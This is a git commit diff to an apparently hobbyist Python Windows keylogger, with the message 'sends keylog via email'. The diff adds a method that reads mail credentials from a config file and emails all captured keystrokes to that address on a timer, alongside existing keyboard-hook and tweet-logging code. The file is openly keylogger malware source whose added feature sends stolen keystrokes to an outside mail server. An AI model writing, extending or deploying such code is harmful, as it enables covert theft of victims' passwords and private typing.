2e09e941863e4f8c56aed2d08c4b36a3e97310dd
tyamlak <tyamlak@gmail.com>
2021-03-24 03:13:11 +0300

    sends keylog via email

--- keylogger.py
+++ keylogger.py
@@ -3,6 +3,9 @@ from threading import Thread
 
 import pythoncom
 import pyWinhook as pyHook
+from utils import send_mail
+import configparser 
+import os
 
 
 class KeyLogger:
@@ -10,6 +13,8 @@ class KeyLogger:
     def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
         self.key_strokes = ""
         self.log_file = None
+        self.timer = Thread(target=self.schedule_log,args=())
+        self.timer.daemon = True
         self.time_interval = time_interval * 60
         if log_method == 1:
             self.log_method = self.log_to_file
@@ -44,9 +49,7 @@ class KeyLogger:
         hm.KeyAll = self.ListenKeyboard
         hm.HookKeyboard()
 
-        t = Thread(target=self.schedule_log,args=())
-        t.daemon = True
-        t.start()
+        self.timer.start()
 
         print("Keylogger started.") # logging
         pythoncom.PumpMessages()
@@ -60,10 +63,21 @@ class KeyLogger:
         print("Tweeting keylogs: ",self.key_strokes)
         self.key_strokes = ""
 
-    def email_log(self):
-        print("Sending email logs: ",self.key_strokes)
+    def email_log(self,login_cred=None):
+        email = None
+        password = None
+        print("Sending email logs...")
+        if login_cred is None:
+            if os.path.exists('email.cfg'):
+                config = configparser.ConfigParser()
+                config.read('email.cfg')
+                email = config['LOGIN_CRED']['EMAIL']
+                password = config['LOGIN_CRED']['PASSWORD']
+        else:
+            email, password = login_cred
+        send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,creds=(email,password))
         self.key_strokes = ""
 
 if __name__ == "__main__":
-    keylogger = KeyLogger()
+    keylogger = KeyLogger(log_method=1)
     keylogger.run()
